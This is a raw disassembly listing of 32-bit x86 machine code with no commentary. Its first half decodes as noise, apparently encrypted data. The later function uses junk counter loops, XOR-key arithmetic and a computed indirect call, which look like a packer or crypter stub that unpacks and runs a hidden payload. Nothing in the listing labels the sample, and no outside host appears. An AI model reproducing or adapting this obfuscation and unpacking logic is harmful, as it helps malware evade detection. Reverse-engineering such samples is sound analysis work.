  4069e9:	adc    ah,BYTE PTR [edi*4-0x7031a0a9]
  4069f0:	or     BYTE PTR [esi+0x50406d37],bl
  4069f6:	ret    0x4d17
  4069f9:	push   0xc37c9f9c
  4069fe:	pop    eax
  4069ff:	test   al,0x0
  406a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a02:	mov    ds:0x6699e4ba,al
  406a07:	push   edi
  406a08:	sub    BYTE PTR [edx],dh
  406a0a:	lahf   
  406a0b:	ins    BYTE PTR es:[edi],dx
  406a0c:	in     al,0xb
  406a0e:	rol    cl,cl
  406a10:	mov    cl,0xec
  406a12:	punpcklwd mm4,DWORD PTR [eax+0x22]
  406a16:	retf   0x9dde
  406a19:	and    dh,BYTE PTR [ebx+0x25]
  406a1c:	ja     0x4069c8
  406a1e:	mov    ah,0xd5
  406a20:	mov    ebp,0x4e7bc340
  406a25:	or     BYTE PTR [esp+eax*4],al
  406a28:	(bad)  [eax]
  406a2a:	mov    edi,0x217d7401
  406a2f:	pushf  
  406a30:	retf   0x272c
  406a33:	lods   al,BYTE PTR ds:[esi]
  406a34:	dec    edi
  406a35:	ret    0x87a8
  406a38:	enter  0x4ac8,0xba
  406a3c:	mov    bh,0xda
  406a3e:	dec    eax
  406a3f:	xchg   DWORD PTR [eax+0x61],ecx
  406a42:	std    
  406a43:	xchg   DWORD PTR [ebp+0xb],esi
  406a46:	fnstsw WORD PTR [ecx+0x7]
  406a49:	mov    ds:0x3d023b45,eax
  406a4e:	addr16 or edx,ecx
  406a51:	push   ebx
  406a52:	(bad)  
  406a53:	adc    al,0x6b
  406a55:	adc    DWORD PTR [esp+ecx*1],edi
  406a58:	push   esp
  406a59:	nop
  406a5a:	xor    DWORD PTR [edi],0xba587101
  406a60:	jg     0x406a7f
  406a62:	addr16 in eax,dx
  406a64:	cwde   
  406a65:	aas    
  406a66:	push   es
  406a67:	xchg   ecx,eax
  406a68:	add    BYTE PTR [esi+0x347a440d],bl
  406a6e:	and    DWORD PTR [ebp+0x23387084],edi
  406a74:	xchg   DWORD PTR [ecx-0xffc03a7],ecx
  406a7a:	add    al,0x1a
  406a7c:	xchg   edx,eax
  406a7d:	scas   eax,DWORD PTR es:[edi]
  406a7e:	xchg   ebp,eax
  406a7f:	fild   QWORD PTR [esi]
  406a81:	pop    es
  406a82:	daa    
  406a83:	(bad)
  406a87:	fisub  WORD PTR [edx-0x3b20b536]
  406a8d:	push   esp
  406a8e:	mov    al,0xd2
  406a90:	fadd   st,st(7)
  406a92:	cmp    BYTE PTR [ebx+eiz*4],bl
  406a95:	into   
  406a96:	jecxz  0x406af3
  406a98:	jns    0x406a1e
  406a9a:	xchg   edi,eax
  406a9b:	push   ds
  406a9c:	retf   0x2e89
  406a9f:	rcl    BYTE PTR [ecx+ebp*4-0x473518a],cl
  406aa6:	mov    esi,0x79b7a9d9
  406aab:	(bad)  
  406aac:	int    0x51
  406aae:	idiv   DWORD PTR [edx+0x22d95b3b]
  406ab4:	cmp    bh,bl
  406ab6:	or     al,0xc6
  406ab8:	lods   al,BYTE PTR ds:[esi]
  406ab9:	loope  0x406aff
  406abb:	popa   
  406abc:	dec    edi
  406abd:	clc    
  406abe:	dec    ebx
  406abf:	xor    al,0x17
  406ac1:	cld    
  406ac2:	cmp    esp,DWORD PTR [ecx+0x5d]
  406ac5:	int    0xc1
  406ac7:	jnp    0x406ac5
  406ac9:	or     ebx,DWORD PTR [ecx-0x35]
  406acc:	mov    bl,ah
  406ace:	and    al,0x6a
  406ad0:	add    BYTE PTR [ebp-0x4c7683a3],dl
  406ad6:	sub    BYTE PTR [ecx-0x6069db25],ah
  406adc:	lds    edi,FWORD PTR ds:0xaa49a656
  406ae2:	neg    DWORD PTR [esp+eax*8]
  406ae5:	cs mov ebx,0x5ccde52b
  406aeb:	cmp    ah,ah
  406aed:	in     eax,dx
  406aee:	stos   DWORD PTR es:[edi],eax
  406aef:	enter  0xe7b7,0x7f
  406af3:	xor    DWORD PTR [esi],0x25632f95
  406af9:	add    DWORD PTR [ebx-0x6e957da1],edx
  406aff:	mov    cl,0xd9
  406b01:	loopne 0x406aab
  406b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b04:	push   eax
  406b05:	pop    eax
  406b06:	adc    al,0xbf
  406b08:	lea    edx,[ebp-0x6fa57f3b]
  406b0e:	fst    QWORD PTR ds:[eax+0x47f7d9fc]
  406b15:	sub    al,0x94
  406b17:	jo     0x406af6
  406b19:	imul   ebx,eax,0xd78b206a
  406b1f:	push   es
  406b20:	xchg   ebp,eax
  406b21:	fs (bad) 
  406b24:	iret   
  406b25:	mov    ebx,0xae8605a1
  406b2a:	pop    es
  406b2b:	rcl    DWORD PTR [esi],1
  406b2d:	xor    al,0xd5
  406b2f:	cmp    al,0x96
  406b31:	mov    bh,dh
  406b33:	mov    eax,cs:0xc5772b5e
  406b39:	dec    ebx
  406b3a:	mov    eax,0x6e6b89d5
  406b3f:	aas    
  406b40:	loop   0x406ac7
  406b42:	push   0xb3a2b6ba
  406b47:	int3   
  406b48:	cmp    al,0x3b
  406b4a:	pushf  
  406b4b:	(bad)  
  406b4c:	push   ebx
  406b4d:	retf   0x970b
  406b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b51:	mov    eax,0x68020fee
  406b56:	popa   
  406b57:	pusha  
  406b58:	and    DWORD PTR [ebp+0x1d1c9e3b],ebp
  406b5e:	test   eax,0x6814f5f8
  406b63:	xchg   esi,eax
  406b64:	mov    edi,0x15ed3787
  406b69:	xchg   ecx,eax
  406b6a:	mov    edi,DWORD PTR [edx]
  406b6c:	outs   dx,BYTE PTR ds:[esi]
  406b6d:	mov    esp,0x5ac92e24
  406b72:	fcomp  DWORD PTR [esi]
  406b74:	sub    ecx,ecx
  406b76:	adc    bl,BYTE PTR [ecx+0x55]
  406b79:	push   esi
  406b7a:	lahf   
  406b7b:	mov    esp,0xdc42e52c
  406b80:	in     eax,0x24
  406b82:	cmp    ebp,DWORD PTR [esi]
  406b84:	sub    ch,ah
  406b86:	inc    ebx
  406b87:	test   BYTE PTR [ebp-0x5d],0x4d
  406b8b:	push   edx
  406b8c:	or     DWORD PTR [ebx],ebx
  406b8e:	mov    ch,al
  406b90:	sbb    eax,0x5d37e6b8
  406b95:	movhps xmm6,QWORD PTR [edi]
  406b98:	inc    edi
  406b99:	xchg   DWORD PTR ds:0x9b29791e,ecx
  406b9f:	sub    dh,BYTE PTR [eax-0x20d56b34]
  406ba5:	xor    BYTE PTR [ecx+0x68],0x41
  406ba9:	icebp  
  406baa:	out    0xf,al
  406bac:	or     ah,BYTE PTR [edx+0x66]
  406baf:	mov    ecx,DWORD PTR ds:0x441f6bb6
  406bb5:	adc    eax,0x28a2252a
  406bba:	fstp   QWORD PTR [esi+eiz*1]
  406bbd:	mov    edi,0x77786d8e
  406bc2:	(bad)  
  406bc3:	(bad)  
  406bc4:	jge    0x406b8e
  406bc6:	addr16 cmp eax,0x2d
  406bca:	cs pop ebp
  406bcc:	pusha  
  406bcd:	shl    BYTE PTR [ebx+0x35],1
  406bd0:	ins    BYTE PTR es:[edi],dx
  406bd1:	call   0xb215ec67
  406bd6:	stc    
  406bd7:	inc    esi
  406bd8:	pop    esp
  406bd9:	mov    cl,0x3d
  406bdb:	mov    al,ds:0xf3fdaedb
  406be0:	xchg   BYTE PTR [eax-0x40],ch
  406be3:	out    dx,al
  406be4:	shr    DWORD PTR [edi+0x2f9fe46d],1
  406bea:	das    
  406beb:	xchg   esp,eax
  406bec:	sub    eax,0x2b75e382
  406bf1:	jmp    0x3950:0x2df5f5a7
  406bf8:	pop    esp
  406bf9:	(bad)  [eax]
  406bfb:	call   0x72a9b416
  406c00:	sbb    cl,al
  406c02:	mov    ds:0x5a277d2f,eax
  406c07:	mov    ds:0xb06a7e7a,al
  406c0c:	sar    BYTE PTR [ecx+0x5400be32],0x48
  406c13:	or     al,dh
  406c15:	cmp    DWORD PTR [edi-0x123a1f88],ebx
  406c1b:	imul   ebp,DWORD PTR ds:0x115ae4be,0xbe28f131
  406c25:	mov    esp,ebp
  406c27:	test   al,0x5e
  406c29:	dec    esi
  406c2a:	daa    
  406c2b:	xor    BYTE PTR [eax],al
  406c2d:	mov    cl,0xbf
  406c2f:	pop    es
  406c30:	cmp    esi,esi
  406c32:	sbb    ecx,DWORD PTR [edi+edi*1+0x78]
  406c36:	jp     0x406c37
  406c38:	repz std 
  406c3a:	into   
  406c3b:	and    al,0xf6
  406c3d:	test   al,0x58
  406c3f:	and    eax,0xb993a7c3
  406c44:	(bad)  
  406c45:	ficomp WORD PTR [ebx-0x66]
  406c48:	push   ebp
  406c49:	jmp    0x0:0x29c840f
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xfe002bde
  406c81:	hlt    
  406c82:	xor    bh,al
  406c84:	ret    0x7e7e
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	pusha  
  406c8c:	mov    cl,0x9f
  406c8e:	mov    al,ds:0x4fe12507
  406c93:	shl    BYTE PTR fs:[ecx],1
  406c96:	dec    ebx
  406c97:	and    al,0x41
  406c99:	into   
  406c9a:	fmul   QWORD PTR [edi-0x52]
  406c9d:	fld    st(2)
  406c9f:	adc    DWORD PTR [edi],ebp
  406ca1:	sub    ecx,DWORD PTR [esi+0x5f5739c6]
  406ca7:	push   edx
  406ca8:	scas   al,BYTE PTR es:[edi]
  406ca9:	inc    esp
  406caa:	pusha  
  406cab:	scas   eax,DWORD PTR es:[edi]
  406cac:	test   DWORD PTR [edi],0xb07bb96b
  406cb2:	dec    ebx
  406cb3:	in     eax,dx
  406cb4:	addr16 xchg esp,eax
  406cb6:	lds    ebp,FWORD PTR [eax+0x62]
  406cb9:	inc    ecx
  406cba:	mov    edx,0x8628c71
  406cbf:	nop
  406cc0:	mov    edi,0x1feafc63
  406cc5:	xchg   ebx,eax
  406cc6:	xchg   ecx,eax
  406cc7:	in     al,0x19
  406cc9:	jns    0x406d31
  406ccb:	xchg   sp,ax
  406ccd:	fs jl  0x406ce8
  406cd0:	sub    BYTE PTR [ecx+0x613d5d09],cl
  406cd6:	jmp    0x406d42
  406cd8:	sub    dh,dl
  406cda:	dec    ebx
  406cdb:	out    dx,al
  406cdc:	call   0x698752bc
  406ce1:	or     esp,DWORD PTR [ebp-0x5c5246e3]
  406ce7:	std    
  406ce8:	dec    ecx
  406ce9:	bound  ebp,QWORD PTR [ecx+0x3df9ee56]
  406cef:	or     eax,0x987f806c
  406cf4:	adc    BYTE PTR [ecx-0x17b2b8c],bl
  406cfa:	push   eax
  406cfb:	dec    esp
  406cfc:	in     al,dx
  406cfd:	xchg   ebx,eax
  406cff:	inc    ecx
  406d00:	pop    eax
  406d01:	pop    ds
  406d02:	cld    
  406d03:	jae    0x406d1f
  406d05:	cs clc 
  406d07:	gs call 0x51b0:0x1c9c4ebe
  406d0f:	jmp    0x285d:0x2a8d9dc1
  406d16:	test   al,0xc3
  406d18:	inc    esp
  406d19:	pop    ss
  406d1a:	fist   WORD PTR [eax+0x13]
  406d1d:	loop   0x406d01
  406d1f:	imul   ebx,DWORD PTR [ebx],0x52
  406d22:	xor    edx,DWORD PTR [eax+0x1d72c3ed]
  406d28:	lock inc esi
  406d2a:	dec    eax
  406d2b:	push   es
  406d2c:	xor    cl,dh
  406d2e:	cmp    ebx,0xffffff8f
  406d31:	xor    BYTE PTR [edx],bh
  406d33:	lods   al,BYTE PTR ds:[esi]
  406d34:	add    al,BYTE PTR [esi]
  406d36:	adc    bl,bh
  406d38:	loop   0x406da8
  406d3a:	shl    DWORD PTR [ebx+ecx*2],1
  406d3d:	jg     0x406d84
  406d3f:	pop    ds
  406d40:	mov    WORD PTR [ecx+0x7c10dde8],?
  406d46:	lock or eax,0xc1c1daa
  406d4c:	test   al,0xa0
  406d4e:	retf   0xb673
  406d51:	jnp    0x406db7
  406d53:	push   esp
  406d54:	mov    dl,0xf
  406d56:	sub    al,0xa9
  406d58:	and    eax,0x2604d62f
  406d5d:	push   ss
  406d5e:	push   ds
  406d5f:	aam    0xf4
  406d61:	popa   
  406d62:	lahf   
  406d63:	(bad)  
  406d64:	and    edx,DWORD PTR ds:0xa587c944
  406d6a:	or     DWORD PTR [ebx-0x599b35b8],ebx
  406d70:	add    al,0xd7
  406d72:	jg     0x406dbe
  406d74:	mov    ebp,0x26b493e7
  406d79:	sti    
  406d7a:	pop    ebx
  406d7b:	adc    al,ch
  406d7d:	pop    edx
  406d7e:	ss xchg ebp,eax
  406d80:	pop    edx
  406d81:	jmp    0x6c5dc75d
  406d86:	retf   
  406d87:	add    al,0xe5
  406d89:	mov    ds:0x1dd3a5b4,eax
  406d8e:	mov    dh,0xb0
  406d90:	aad    0xc9
  406d92:	lahf   
  406d93:	pop    ss
  406d94:	test   eax,0x10c904c7
  406d99:	stc    
  406d9a:	out    0x74,eax
  406d9c:	popf   
  406d9d:	cwde   
  406d9e:	fdivr  st,st(4)
  406da0:	(bad)  
  406da1:	pop    esi
  406da2:	(bad)  
  406da3:	push   edx
  406da4:	sub    eax,0x58deb1c7
  406da9:	adc    ebx,0x8551a758
  406daf:	jp     0x406dc5
  406db1:	pop    edx
  406db2:	xchg   edi,eax
  406db3:	xchg   ecx,eax
  406db4:	rcl    BYTE PTR [esi-0x36c71e2c],1
  406dba:	je     0x406e38
  406dbc:	cs xchg esi,eax
  406dbe:	or     al,BYTE PTR [esi+edi*2]
  406dc1:	arpl   WORD PTR [ebx+0x52],si
  406dc4:	int3   
  406dc5:	mov    ecx,0x6ef345b1
  406dca:	jnp    0x406de4
  406dcc:	popf   
  406dcd:	scas   eax,DWORD PTR es:[edi]
  406dce:	test   BYTE PTR [ebx+0x1],cl
  406dd1:	hlt    
  406dd2:	adc    esi,edi
  406dd4:	lahf   
  406dd5:	pop    ds
  406dd6:	cmc    
  406dd7:	pushf  
  406dd8:	and    al,0x9
  406dda:	loope  0x406dbf
  406ddc:	mov    dl,ch
  406dde:	shl    DWORD PTR [ebp-0x67903f7b],1
  406de4:	repnz int3 
  406de6:	jmp    0xb2d3:0x47ed05e8
  406ded:	cmp    eax,0xfb39a820
  406df2:	xchg   esi,eax
  406df3:	ret    0x8d39
  406df6:	rsm    
  406df8:	add    DWORD PTR [edi+0x2e],edi
  406dfb:	pop    eax
  406dfc:	inc    edx
  406dfd:	push   ds
  406dfe:	(bad)
  406e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e03:	es cmp al,0x75
  406e06:	call   0xc0c5d550
  406e0b:	dec    edx
  406e0c:	xchg   esi,eax
  406e0d:	loopne 0x406df4
  406e0f:	xor    eax,edx
  406e11:	inc    esi
  406e12:	test   eax,0x36095238
  406e17:	xchg   edx,eax
  406e18:	mov    esp,0xc273e7b9
  406e1d:	dec    ebp
  406e1e:	std    
  406e1f:	jl     0x406e29
  406e21:	test   eax,0x817dc000
  406e26:	es sbb edx,ebp
  406e29:	js     0x406e39
  406e2b:	sti    
  406e2c:	sub    DWORD PTR [esi+ebx*8],edx
  406e2f:	mov    eax,ds:0x76aafe27
  406e34:	pop    ebx
  406e35:	mov    DWORD PTR [edi-0x5e],ecx
  406e38:	inc    esp
  406e39:	shl    DWORD PTR [ebp+0x770b4362],0xdd
  406e40:	fldcw  WORD PTR [ebx-0x3c]
  406e43:	aaa    
  406e44:	ret    
  406e45:	jmp    0x611b2c32
  406e4a:	mov    ecx,0x3cf59834
  406e4f:	add    esi,DWORD PTR [esi+0x13]
  406e52:	push   ebx
  406e53:	pmaddwd mm2,QWORD PTR [eax]
  406e56:	into   
  406e57:	cmp    DWORD PTR [eax-0x3],eax
  406e5a:	sahf   
  406e5b:	test   eax,0x4cb47736
  406e60:	int    0x51
  406e62:	cli    
  406e63:	mov    edi,0x2c8b961
  406e68:	inc    esp
  406e69:	cld    
  406e6a:	scas   al,BYTE PTR es:[edi]
  406e6b:	mov    dl,0xb4
  406e6d:	test   eax,0x394a7813
  406e72:	or     esp,ecx
  406e74:	pop    edi
  406e75:	fwait
  406e76:	cmp    BYTE PTR [eax+0x430b1eb0],0x8b
  406e7d:	jo     0x406e94
  406e7f:	inc    esi
  406e80:	and    bl,BYTE PTR [ebx+0x114ae6eb]
  406e86:	sbb    bl,al
  406e88:	aam    0x16
  406e8a:	adc    bl,BYTE PTR [edi+0x16c22a3]
  406e90:	shl    DWORD PTR [ebx-0x7fd706ac],1
  406e96:	test   al,0x39
  406e98:	repnz dec ebx
  406e9a:	push   cs
  406e9b:	test   edx,edi
  406e9d:	icebp  
  406e9e:	mov    ebp,0x90576ca2
  406ea3:	int3   
  406ea4:	outs   dx,DWORD PTR ds:[esi]
  406ea5:	ins    BYTE PTR es:[edi],dx
  406ea6:	pusha  
  406ea7:	push   0xb0d221c5
  406eac:	daa    
  406ead:	or     al,0x6d
  406eaf:	add    edx,DWORD PTR [edx-0x10]
  406eb2:	sbb    BYTE PTR [ecx-0x79],al
  406eb5:	push   ss
  406eb6:	pop    ss
  406eb7:	jbe    0x406e60
  406eb9:	das    
  406eba:	adc    eax,DWORD PTR [edx-0x6e]
  406ebd:	xor    esi,eax
  406ebf:	inc    edx
  406ec0:	inc    ebp
  406ec1:	and    edi,DWORD PTR [ebx+0x30]
  406ec4:	ret    0x7909
  406ec7:	cdq    
  406ec8:	push   0x21
  406eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ecb:	add    eax,0x99399dc3
  406ed0:	icebp  
  406ed1:	scas   al,BYTE PTR es:[edi]
  406ed2:	pop    edi
  406ed3:	jl     0x406ed7
  406ed5:	aam    0x6a
  406ed7:	xor    BYTE PTR [ebp-0x52],al
  406eda:	jmp    0xd156:0x8a0a361d
  406ee1:	lahf   
  406ee2:	js     0x406f33
  406ee4:	pushf  
  406ee5:	stos   DWORD PTR es:[edi],eax
  406ee6:	repnz or cl,BYTE PTR [ebx-0x16]
  406eea:	adc    BYTE PTR [ebx-0x75],dl
  406eed:	inc    ebp
  406eee:	adc    cl,cl
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43366f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433623,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43372f,0x433613
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43372f,0x4336a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4336eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4336bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433727
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4336fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4336fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4336fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433767
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4336fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4336fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4336fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4336fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4336fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43362b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433673,0x15
  406fee:	cmp    DWORD PTR ds:0x433673,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433673,0x2
  407002:	jne    0x40701d
  407008:	push   0x43367b
  40700d:	push   0x433703
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433673,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433673
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433673,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433673
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433673,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4336ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43362f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43362f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43362f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43362f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43362f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43362f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433647
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4336b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433633,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43366f,0x433627
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43361f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4336a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4336a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4336a7,ebx
  407108:	cmp    DWORD PTR ds:0x4336a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4336a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4336a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4336a7,ebx
  407144:	cmp    DWORD PTR ds:0x4336a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4336eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43361b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433743,0x1c
  407175:	cmp    DWORD PTR ds:0x433743,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433743,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43379a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433743
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433743,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43361f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43361f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43361f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43361f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43361f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43361f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43361f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43361f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433683,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433683
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433683,ebx
  407226:	cmp    DWORD PTR ds:0x433683,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433683,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433683
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433683,ebx
  40725e:	cmp    DWORD PTR ds:0x433683,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43362f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43361f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4336f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
